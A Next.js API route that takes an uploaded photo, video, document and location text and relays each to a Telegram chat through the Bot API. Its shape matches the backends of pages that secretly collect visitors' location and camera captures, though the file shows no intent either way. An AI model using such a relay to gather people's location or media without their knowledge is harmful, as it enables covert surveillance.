import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const data = await request.formData();
    const photo = data.get("photo") as File | null;
    const video = data.get("video") as File | null;
    const document = data.get("document") as File | null;
    const locationInfo = data.get("locationInfo") as string | null;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return NextResponse.json(
        { error: "Telegram credentials missing" },
        { status: 500 }
      );
    }

    // 1. Send Location Info as Text
    if (locationInfo) {
      const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(textUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: `[DATA]\n\n${locationInfo}`,
        }),
      });
    }

    // 2. Send Photo
    if (photo && photo.size > 0) {
      const photoFormData = new FormData();
      photoFormData.append("chat_id", chatId);
      photoFormData.append("photo", photo);

      const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
      await fetch(photoUrl, {
        method: "POST",
        body: photoFormData,
      });
    }

    // 3. Send Video
    if (video && video.size > 0) {
      const videoFormData = new FormData();
      videoFormData.append("chat_id", chatId);
      videoFormData.append("video", video);

      const videoUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
      await fetch(videoUrl, {
        method: "POST",
        body: videoFormData,
      });
    }

    // 4. Send Document (file upload)
    if (document && document.size > 0) {
      const docFormData = new FormData();
      docFormData.append("chat_id", chatId);
      docFormData.append("document", document);

      const docUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
      await fetch(docUrl, {
        method: "POST",
        body: docFormData,
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Telegram API Error:", error);
    return NextResponse.json(
      { error: "Failed to send data" },
      { status: 500 }
    );
  }
}
